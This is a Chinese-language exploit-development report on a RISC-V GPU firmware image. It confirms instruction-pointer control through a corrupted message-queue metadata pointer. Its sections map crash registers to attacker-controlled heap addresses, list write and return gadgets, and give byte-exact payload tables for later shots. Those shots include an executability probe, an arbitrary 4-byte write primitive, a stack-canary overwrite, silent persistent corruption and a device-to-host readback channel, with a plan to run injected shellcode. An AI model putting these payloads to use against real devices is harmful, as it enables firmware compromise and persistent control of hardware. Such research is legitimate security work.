# K3 设备侧:IP 控制已达成 —— 下一枪目标选择(2026-09-26)

纯静态、离线、只读。承接 `K3_STAGING_ADJACENCY_20260926.md`(下称"上份报告")。
**枪 A 已命中**:`guest_dmesg_K33_DEADBEEF_0722.txt` 显示 `sepc=stval=0xdeadbeee`(jalr 清低位)、`scause=0xc`、`ra=0x1004c9e`、`a5=0xdeadbeef` —— 我们写入 meta+0xb8 的字节被 `ld a5,0xb8(a0); jalr a5`(0x1004c8c/0x1004c9c)取作执行指针,IP 控制确认。
对象:`gsp61057_rx_full.bin`(RV64GC,基址 0x1000000,VA = 文件偏移 + 0x1000000)。

置信度:A=指令级直接证据且与崩溃寄存器完全互证;B=结构级;C=推断。**不确定处明确标注。**

## 0 方法与新增工具(均在 `parallel/k3_device_work/`,可重跑)

- `gadget_store_ret.py` / `gadget_store_ret.results.txt`:全镜像扫描"store 到 imm(a0) 后干净 ret(不碰 sp、无副作用,可选 `li a0,imm`)"的 gadget,52 个命中。
- `csr_scan.py` / `csr_scan.results.txt`:扫描 satp/sfence.vma/PMP/mstatus 等 CSR 指令;9 处候选经上下文复核**全部为数据区误解码**(见 Q2)。
- 新证据:`ev_gadget_0x17460e8.asm`、`ev_txpost_0x1b594d0.asm`(fcnInvalidate 调用点所在函数,0x4a0 字节)、`ev_copyhelper_full_0x100cf9c.asm`、`ev_markconsumed_full_0x1004cdc.asm`。
- 复核命令:
```bash
cd /home/user/rt_5090_project/parallel/k3_device_work
python3 gadget_store_ret.py          # 写原语 gadget 清单
python3 csr_scan.py                  # MMU/PMP 证据(全为假命中)
python3 -c "from rvlib import *; print(dump(0x1004c6c, 0x70))"   # 崩溃点所在函数
```

---

## Q1 崩溃寄存器 → 内存归属:我们已握有"自己字节的地址" —— A 级

把崩溃现场(`guest_dmesg_K33_DEADBEEF_0722.txt`)与 recv(0x1016104)/ rxrefresh(0x1004c6c)逐指令对照,**全部 s 寄存器与 a0-a5 无一生疑**:

| 寄存器 | 崩溃值 | 身份(指令级证据) | 我们的字节? | 置信 |
|---|---|---|---|---|
| a0 | 0x0fe4790e9c | 0x1004c98 `addi a0,a0,0x8c`:**meta+0x8c**(rx.writePtr 字段地址) | **是**(元素32覆盖) | A |
| a1 | 0 | 0x1004c8e `ld a1,0x38(a0)` = meta+0x38(我们清零) | 是(其值) | A |
| a4 | 0 | 0x1004c92 `ld a4,0xc0(a0)` = meta+0xc0(我们清零;原值 0x4191620) | 是(其值) | A |
| a5 | 0xdeadbeef | 0x1004c8c `ld a5,0xb8(a0)` = **meta+0xb8 我们的标记** | 是 | A |
| s1 | 0x0fe4790e10 | rxrefresh 入口保存的 handle = **msgqMetadata 本体 = P+0x20000** | **是**(元素32) | A |
| s8 | 0x0fe4790e10 | recv 0x101612a `ld s8,0x1a8(s11)` = hQueue = 同上 | **是** | A |
| s3 | 0x0fe4770e10 | recv 0x1016144 `c.mv s3,s5`,重试第 1 遍尚未推进 ⇒ **P = RX staging 基址** | **是**(元素0起) | A |
| s5 | 0x0fe4770e10 | recv 0x101612e `ld s5,0x198(s11)` = MQI+0x198 = **P** | **是** | A |
| s11 | 0x41914d0 | MQI(BSS) | 否 | A |
| s2/s4/s6/s7/s9/s10 | 1/0/1/3/1/1 | recv 内立即数与 MQI+0x1b4(期望序号=1) | — | A |
| t2 | 0x15129b000 | recv/rxrefresh 均不设 t2;**陈旧值**。页对齐,疑似 sysmem 队列 DVA(设备侧 VA) | 未知 | **C** |
| a6 | 0x0c200138 | 同上,陈旧;来源未钉 | 未知 | C |
| tp | 0x0febc00000 | 任务 TLS;**K17/K19/K33 三次启动完全相同** | — | A(相同性) |
| sp | 0x0feb80fb80 | 泵任务栈(0x0feb… 区) | 否 | A |

**关键推论(A 级):P = 0x0fe4770e10,s1−s3 = 0x20000 与 init 布局精确吻合。** 即:
- RX staging(元素 0..15)= `[0x0fe4770e10, 0x0fe4780e10)`
- TX staging(元素 16..31)= `[0x0fe4780e10, 0x0fe4790e10)`
- msgqMetadata(元素 32)= `[0x0fe4790e10, 0x0fe4790ef8)`

**堆地址跨启动确定性:B 级(单次观测)。** 支持证据:tp 三次启动逐位相同;init 分配序列固定(页表分配→staging 0x200e8→MQI+0x1e8 对象,上份报告 §1.4),启动路径无熵源。但只有一份 K33 样本 ⇒ **枪 E1 兼作确定性检验**(若 sepc≠0x0fe4790e10 则 P 漂移,依赖 P 的载荷全部作废,gadget 枪不受影响)。

**∴ 下一枪已可以让 +0xb8 指向我们自己的数据**(P 及偏移均已知),也可以指向镜像内任意 gadget。

---

## Q2 可执行性:镜像内无 MMU 证据,XN 未知;给出最小验证载荷 —— 静态部分 A 级,结论"不确定"

### 静态证据(已证)

- `csr_scan.py`:全镜像 2 字节对齐扫描 satp(0x180)/sfence.vma/pmpcfg/pmpaddr/mstatus/medeleg 等,共 9 处候选;逐个人工复核上下文,**全部是数据区误解码**(例:0x1e8bc1c 的 "csrc mideleg" 实为 ASCII "s000";0x1d4b964 的 "csrrc a7,pmpcfg2,sp" 前后是 `bgeu s1,s1`(永真)与浮点常量)。
- 崩溃报告自称 "Reported by **libos partition:4#5 kernel v3.1**":GSP-RM 是 libos 微内核上的任务,**页表/PMP 由 libos 内核(独立二进制,不在本镜像)设置**。
- **∴ staging/堆区的 XN 位从现有工件静态不可知。不确定。**

### 最小验证载荷 = 枪 E1(兼堆确定性检验)

K=33,ck=0(与枪 A 完全同路径),元素 32 仅:

| 元素32内偏移 | 值(小端) | 含义 |
|---|---|---|
| 0x0a4 | `01` | rxLinked=1 |
| 0x0b8 | `10 e0 79 f4 0e 00 00 00` | +0xb8 = **0x0fe4790e10 = meta 基址(我们自己的全零字节)** |

判读(sepc 是判别器):
- `sepc=stval=0x0fe4790e10, scause=0xc` ⇒ **堆 XN**,自己的字节不能当代码跑 ⇒ 走 gadget 路线(E3/E4);
- `sepc=0x0fe4790e10, scause=0x2`(非法指令,0x0000 = c.unimp)⇒ **堆可执行** ⇒ 之后可直接把 +0xb8 指向 TX staging(0x0fe4780e10,16KB 可控空间)里的 RISC-V shellcode;
- `sepc ≠ 0x0fe4790e10` ⇒ 堆地址漂移,E1 类依赖 P 的载荷作废。

---

## Q3 用崩溃现场寄存器状态可直接调用的目标 —— 按收益/风险排序

先钉死两个劫持点的实参(A 级,`ev_msgq_rxrefresh_0x1004c6c.asm` / `ev_markconsumed_full_0x1004cdc.asm`):

| 调用点 | 触发条件 | a0 | a1 | a2 | a3 | a4 |
|---|---|---|---|---|---|---|
| rxrefresh 0x1004c9c(已实测) | ck=0 重试即达 | meta+0x8c(**固定**) | meta+0x38(**全控**) | 4 | 0 | meta+0xc0(**全控**) |
| MarkConsumed 0x1004d30 | ck=1+seq gap(枪C路径)或后续正常消费 | meta+0x40(**全控**) | meta+0x9c(固定指针,内容可控) | 4 | 1 或 0x101(+0xa5 控) | meta+0xc0(**全控**) |

### (a) 受控内存写

1. **0x17460e8 `c.sw a4, 0(a0); c.li a0, 0; c.jr ra`** —— **金牌 gadget**(`ev_gadget_0x17460e8.asm`,指令边界干净,无 sp 操作)。
   经 MarkConsumed 调用 ⇒ **`*(u32*)A = V`,A=meta+0x40 值、V=meta+0xc0 低 32 位,地址与值全控**;且返回 a0=0 → MarkConsumed 走成功路径(rxAvail 归 0、+0xd0/+0xe0/+0xa8 置 0 跳过、返 0)→ recv 返 0x25,**GSP 存活,原语可重复**(A 级推演,见 Q5 枪 E3/E4)。
   经 rxrefresh 调用 ⇒ 只能写 meta+0x8c 自身(a0 固定),价值有限但同样安全。
2. 0x1b42b32 `c.sd a4, 0x58(a0); c.addi sp, 0x10; c.jr ra` —— 8 字节写(值=meta+0xc0 全 64 位),**但 sp 泄漏 0x10 会破坏 MarkConsumed 的帧恢复**(epilogue 按错位 sp 取 ra → 野跳)。只适合"写完即崩"的一次性场景;有 0x17460e8 就不必用它。**不推荐。**
3. 原 helper **0x100cf9c** —— dst 被强制限定在 sysmem 队列窗口(queueinfo 0x4191620:+0x78 基址、+8 尺寸,0x100cfec-0x100cff8 边界检查,越窗返 0x40 不解引用),随后经 +0x80 页表翻译 + DMA 拷贝(`ev_copyhelper_full_0x100cf9c.asm`)。**写入内容主机可见 ⇒ 回读信道**(枪 F)。不能写设备内部地址。

### (b) 安全返回(让 recv 继续 ⇒ 静默持久化)

- **0x100dcba `c.li a0, 0; c.jr ra`**(已验证为真实指令边界;全镜像 740 个同型)。rxrefresh 收到 a0=0 后按我们伪造的 meta 字段(+0x8c writePtr / +0x88 msgCount / +0x9c readPtr)重算 rxAvail;令 writePtr=readPtr ⇒ rxAvail=0 ⇒ recv 返 0x10006(队列空),**无崩溃、meta 保持腐化** = 枪 E2。
- 备选:原 fcnBarrier 0x1004c5c(`fence; ret`,a0 不变≠0 → rxrefresh 视为错误返 0,效果相近)。

### (c) 寄存器/特权相关

- **本镜像无任何真实 CSR 指令(Q2)⇒ 没有直接的特权/CSR 调用目标。** 特权操作在 libos 内核,不在攻击面内。此为确定性否定结论(A)。
- 间接路径(B/C):用 (a) 的任意写打以下设备内部目标,触发后续内部路径——
  - 栈金丝雀全局 **0x418ff68**(lookup 0x101dcb4、TX-post 0x1b594d0、crashfn 0x1b8feec 均引用)⇒ 下一次校验失败走 fail 钩(0x1b4da14 附近),**崩溃 PC 与此前所有枪都不同 ⇒ 最便宜的"写入已落地"可观测信号**;
  - MQI+0x1b4 = **0x4191684**(期望序号,BSS 可写)⇒ 静默改变后续 seq 检查;
  - registry 表指针 **0x41d3f38** ⇒ lookup 用错表,行为改变(收益未钉,C)。

---

## Q4 其它劫持槽:调用点、寄存器状态、最优槽 —— A 级(除触发时机)

| 槽 | 语义 | 调用点(VA) | 调用点寄存器状态 | 触发时机 |
|---|---|---|---|---|
| +0xb8 | fcnBackendRw | 0x1004c9c(rxrefresh)/ **0x1004d30(MarkConsumed)** | 见 Q3 表 | ck=0 重试 / ck=1+seq gap |
| +0xc0 | fcnBackendRwArg | **从不被调用**;在两个 +0xb8 调用点作为 **a4 实参**(0x1004c92 / 0x1004d1e `ld a4, 0xc0`)载入 | — | — |
| +0xc8 | fcnInvalidate | TX-post 函数 **0x1b594d0** 内 **0x1b597c6**(`ld a4,0xc8(s8); ld a0,0x30(s8); li a1,4; jalr a4`);该函数有 **24 个调用点** = 所有 GSP→host 发帖路径(`ev_txpost_0x1b594d0.asm`) | **a0 = meta+0x30(全控!)**,a1=4,a4=目标自身 | 腐化后任何 GSP→host 消息;但 ck=0 静默落地后 init 阻塞、未必有 TX ⇒ **触发时机不确定(C)** |
| +0xd0 | fcnFlush | MarkConsumed **0x1004d4a**(+0xb8 成功后) | a0 = meta+0x40(全控),a1=4 | 同 MarkConsumed;置 0 即跳过(0x1004d44 beqz) |
| +0xe0 | fcnBarrier | MarkConsumed **0x1004d50** | a0 = fcnFlush 的返回值(无独立实参设置) | 同上;置 0 跳过(0x1004d4e beqz) |
| +0xa8 | (回调) | MarkConsumed **0x1004d5a** | a0=1,a1 = meta+0xb0(全控) | 同上;置 0 跳过 |

**结论:下一枪的最优槽仍是 +0xb8,但应把调用点从 rxrefresh 换到 MarkConsumed** —— 那里 **a0 与 a4 双双全控**(rxrefresh 处 a0 被钉死在 meta+0x8c)。+0xc8 是次优(a0 全控但 a1=4 固定、且触发时机不可控)。+0xd0/+0xe0/+0xa8 在组合枪里一律置 0 跳过。

---

## Q5 组合载荷规格(按优先级排序)

通用:K=33(元素 32 覆盖 msgqMetadata,同一块分配内必然命中);元素 0 头部同前几枪;元素 1..31 全零;元素 32 除表列字段外全零。ck=1 时宿主重算 checkSum(harness 已支持,见 `guest_dmesg_K256_0713.txt` "cksum fixed");**ck=1 枪需把报文 seqNum(头部 +0xc)填 0**(实测崩溃现场 s10=期望序号=1 ⇒ 0 < 1,seq gap 路径 0x10163b8→0x10163f8 调 MarkConsumed(handle, 33);B 级,若无效见枪 E3 判读)。

### 枪 E1【最优先】可执行性 + 堆确定性检验(ck=0)

| 元素32内偏移 | 值 |
|---|---|
| 0x0a4 | `01` |
| 0x0b8 | `10 e0 79 f4 0e 00 00 00`(= 0x0fe4790e10,meta 基址) |

预测与判读见 Q2(sepc=0x0fe4790e10:scause=0xc ⇒ XN;scause=0x2 ⇒ 可执行;sepc 不等 ⇒ 堆漂移)。

### 枪 E3【第二】任意写证明(写崩版,ck=1,seq=0)

| 偏移 | 值 | 含义 |
|---|---|---|
| 0x28 | `00…00` | pTheirEntries=0(事后重试拷贝被边界检查安全拒绝) |
| 0x40 | `00 00 ad de 00 00 00 00` | a0 = DST = 0xDEAD0000(必未映射) |
| 0x88 | `21 00 00 00` | msgCount=33 |
| 0x9c | `00 00 00 00` | readPtr=0(newread=33 ⇒ 回绕后存 0) |
| 0xa0 | `21 00 00 00` | rxAvail=33(过 0x1004cf8 检查,不进嵌套 rxrefresh) |
| 0xa4 | `01` | rxLinked=1 |
| 0xb8 | `e8 60 74 01 00 00 00` | 目标 = 0x17460e8(`c.sw a4,0(a0); li a0,0; ret`) |
| 0xc0 | `44 33 22 11 00 00 00 00` | a4 = VAL = 0x11223344 |
| 0xc8 / 0xd0 / 0xe0 / 0xa8 | `00…00` | 全部跳过 |

**预测:`scause=0xf`(store 页fault)、`sepc=0x17460e8`、`stval=0xdead0000`、GPR `a0=0xdead0000, a4=0x11223344, a5=0x17460e8`,PC Trace 含 0x1004d30 / 0x10163fc。** ⇒ 任意地址写瞄准证实。
若未崩且 RPC 仅返错:seq gap 未触发(期望值可能已为 0)⇒ 退化方案:先打 E2 静默落地,再设法让宿主发第二条正常消息(正常消费也走 MarkConsumed 0x1004d30)。

### 枪 E4【第三】隐蔽写 + 可观测落地(ck=1,seq=0)

同 E3,仅改:
- **E4-canary**:+0x40 = `68 ff 18 04 00 00 00 00`(0x418ff68),+0xc0 = `41 00 ad de …`(低 32 = 0xdead0041,注意 ≥33 可让事后 rxrefresh 干净退出)。预测:**无 0x17460e8 fault**;之后在 TX-post/lookup 等带 canary 的函数退出时校验失败,崩溃 PC 落在 fail 钩(0x1b4da14 附近)——**与前所有枪都不同的新崩溃形态 = 写入落地**。
- **E4b-静默对照**:+0x40 = `84 16 19 04 00 00 00 00`(MQI+0x1b4=0x4191684),+0xc0 = `41 00 00 00…`。预测:**完全无崩溃**(同 E2 表现),用于区分"写入成功但不可观测"与"未写入"。

### 枪 E2【第四】静默持久化对照(ck=0,最便宜)

| 偏移 | 值 |
|---|---|
| 0x88 | `40 00 00 00`(msgCount=64) |
| 0x8c / 0x9c / 0xa0 | `00…00`(writePtr=readPtr=0 ⇒ rxAvail 重算=0) |
| 0xa4 | `01` |
| 0xb8 | `ba dc 00 01 00 00 00 00`(0x100dcba,`li a0,0; ret`) |

预测:**无任何 GSP 崩溃报告**,宿主侧表现为 RPC 超时/初始化失败(与上份报告枪 B 同形态);meta 保持腐化。证明字节级精确控制 + 提供持久腐化态。

### 枪 F【第五】主机可见写 + t2 假设检验(ck=1,seq=0)

同 E3 框架,改:+0xb8 = `9c cf 00 01…`(原 helper 0x100cf9c)、+0xc0 = `20 16 19 04…`(原 queueinfo 0x4191620)、+0x40 = **0x15129b000 + X**(t2 假设:sysmem 队列 DVA)、+0x9c = W(自选标记 u32)、+0xa5=0(a3=1,sysmem 写方向)。
预测:宿主扫描自己的 0x40000 队列缓冲 ⇒ **出现 W = 写入落地且 t2=窗口基址假设成立,同时获得设备→主机回读信道**;未出现且无崩溃 = t2 假设错误或越窗被拒(helper 返 0x40,安全无副作用)。(C 级假设,二分代价一枪。)

---

## 置信度汇总

| 结论 | 置信 |
|---|---|
| a0=meta+0x8c、s1=s8=meta=0x0fe4790e10、s3=s5=P=0x0fe4770e10;我们的字节地址已知 | A(与崩溃寄存器逐位互证) |
| tp 三次启动相同;堆/staging 地址大概率跨启动确定 | A(相同性)/ **B(确定性,单样本)** |
| 镜像内无真实 satp/sfence/PMP/CSR 指令;XN 由 libos 决定,**静态不可知** | A(否定结论)/ 结论本身"不确定" |
| MarkConsumed 0x1004d30 调用点 a0/a4 全控;rxrefresh 0x1004c9c a0 固定、a1/a4 控 | A |
| gadget 0x17460e8 = `sw a4,0(a0); li a0,0; ret` ⇒ 任意 4 字节写 + 干净返回 | A(指令级)/ B(端到端推演未实测) |
| +0xc8 由 TX-post 0x1b594d0 @0x1b597c6 调用,a0=meta+0x30 全控,24 调用点 | A(调用点)/ **C(触发时机)** |
| seq gap 路径(ck=1、seq=0<期望 1)触发 MarkConsumed(handle,33) | B(期望值=1 来自单次崩溃现场 s10) |
| t2=0x15129b000 为 sysmem 队列 DVA | C(枪 F 检验) |
| a6=0x0c200138、t0=0x22 等陈旧值来源 | C(未钉;0x22 与 `li t0,0x22; c.unimp` 断言惯例同值,疑似) |

## 总结

枪 A 的寄存器现场与 recv/rxrefresh 反汇编逐位互证:a0=meta+0x8c、s1=s8=meta、s3=s5=P——**我们已经知道自己字节的设备地址(P=0x0fe4770e10,meta=P+0x20000)**,且 tp 三次启动完全相同支持布局确定性(单样本,B 级,枪 E1 顺带复验)。镜像内没有任何真实的 MMU/PMP/CSR 指令(9 处候选全部为数据区误解码),堆区 XN 由镜像外的 libos 内核决定,**静态不可知**——枪 E1 用 +0xb8=meta 基址一枪判定:scause=0xc 则 XN、scause=0x2 则可执行。劫持槽清点后最优仍是 +0xb8,但应把调用点从 rxrefresh 换到 **MarkConsumed(0x1004d30)**:那里 **a0=meta+0x40 与 a4=meta+0xc0 双双全控**;配合金牌 gadget **0x17460e8(`sw a4,0(a0); li a0,0; ret`)** 即成"任意 4 字节写 + GSP 存活"的稳定原语。触发该调用点需 ck=1 + seqNum=0(gap 路径,B 级)。载荷优先级:**E1(XN/确定性)→ E3(任意写证明,DST=0xdead0000 预测 scause=0xf/stval=DST)→ E4(打 canary 0x418ff68 或 MQI+0x1b4,隐蔽写+可观测落地)→ E2(ck=0 静默持久化)→ F(原 helper 写 sysmem 窗口,验 t2 假设并开回读信道)**。+0xc8(TX-post,a0 全控)留作触发时机不可控的备选槽;+0xd0/+0xe0/+0xa8 一律置 0 跳过。
